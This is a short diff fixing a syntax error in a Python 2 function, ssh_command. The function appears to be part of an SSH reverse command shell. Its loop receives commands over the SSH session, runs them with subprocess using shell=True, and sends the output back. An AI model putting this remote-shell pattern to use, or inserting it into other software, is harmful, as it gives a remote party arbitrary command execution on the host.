@@ -14,7 +14,7 @@ def ssh_command(ip, user, passwd, command):
         print ssh_session.recv(1024)
         while True:
             command = ssh_session.recv(1024)
-            try
+            try:
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
             except Exception, e:
